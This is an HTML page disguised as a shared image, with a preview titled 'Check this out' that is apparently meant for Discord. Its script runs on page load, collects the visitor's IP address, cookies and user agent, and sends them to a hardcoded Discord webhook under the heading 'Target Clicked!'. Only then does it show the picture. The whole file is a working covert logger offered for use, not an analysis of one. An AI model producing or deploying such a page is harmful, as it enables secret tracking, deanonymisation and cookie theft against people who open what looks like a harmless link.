<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image</title>
    
    <!-- Use the direct Imgur link for Discord Preview -->
    <meta property="og:image" content="https://i.imgur.com/6hLYgA4.png">
    <meta property="og:title" content="Check this out">
    <meta property="og:description" content="">
    
    <style>
        body { margin: 0; padding: 0; background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; }
        img { max-width: 90vw; max-height: 90vh; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
    </style>
</head>
<body>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1572396924575678506/DHAfoB_LoRotUSRW7xM4JoyN-zK-eKZ82BmtXNMdlXb7Mia2eyzNuXPXJev2eM4chhvG";
    const IMG_SRC = "https://i.imgur.com/6hLYgA4.png"; // Your direct link

    // Run logging immediately
    (async () => {
        try {
            // 1. Get IP
            let ip = "Unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch (e) {}

            // 2. Send Data
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "🕵️‍♂️ Target Clicked!",
                        color: 15158332,
                        fields: [
                            { name: "🌐 IP", value: `\`${ip}\``, inline: true },
                            { name: "🔑 Cookies", value: `\`\`\`${document.cookie}\`\`\``, inline: false },
                            { name: "📅 Time", value: new Date().toLocaleString(), inline: false },
                            { name: "💻 User Agent", value: navigator.userAgent, inline: false }
                        ]
                    }]
                })
            });
        } catch (e) {
            console.error("Logging failed", e);
        } finally {
            // 3. Show Image regardless of success/failure
            const img = document.createElement('img');
            img.src = IMG_SRC;
            document.body.appendChild(img);
        }
    })();
</script>

</body>
</html>
